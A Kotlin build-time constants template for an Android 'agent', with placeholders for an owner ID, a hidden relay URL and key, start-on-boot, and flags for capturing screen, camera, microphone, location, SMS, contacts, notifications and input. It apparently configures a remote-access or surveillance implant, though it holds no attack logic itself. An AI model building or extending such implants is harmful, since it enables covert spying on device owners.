package com.veltrix.agent

/** Per-build constants — overwritten by the build server before compilation. */
object Binding {
    const val OWNER_USER_ID = "{{USER_ID}}"
    const val SENTINEL_SERVER = "{{API_BASE}}"
    const val BUILD_NAME = "{{BUILD_NAME}}"
    const val PLATFORM = "android"

    const val HIDEN_WS_URL = "{{RELAY_URL}}"
    const val HIDEN_AUTH_KEY = "{{HIDEN_AUTH_KEY}}"

    const val SUPABASE_URL = "{{SUPABASE_URL}}"
    const val SUPABASE_ANON_KEY = "{{SUPABASE_ANON_KEY}}"

    const val DEBUG = {{DEBUG}}
    const val STARTUP_ON_BOOT = {{FEATURE_STARTUP}}
    const val BUILD_TAG = "{{BUILD_TAG}}"

    // Feature flags
    const val FEAT_SCREEN = {{FEATURE_SCREEN}}
    const val FEAT_CAMERA = {{FEATURE_CAMERA}}
    const val FEAT_FILES = {{FEATURE_FILES}}
    const val FEAT_MIC = {{FEATURE_MIC}}
    const val FEAT_LOCATION = {{FEATURE_LOCATION}}
    const val FEAT_SMS = {{FEATURE_SMS}}
    const val FEAT_CONTACTS = {{FEATURE_CONTACTS}}
    const val FEAT_NOTIFICATIONS = {{FEATURE_NOTIFICATIONS}}
    const val FEAT_INPUT = {{FEATURE_INPUT}}
}
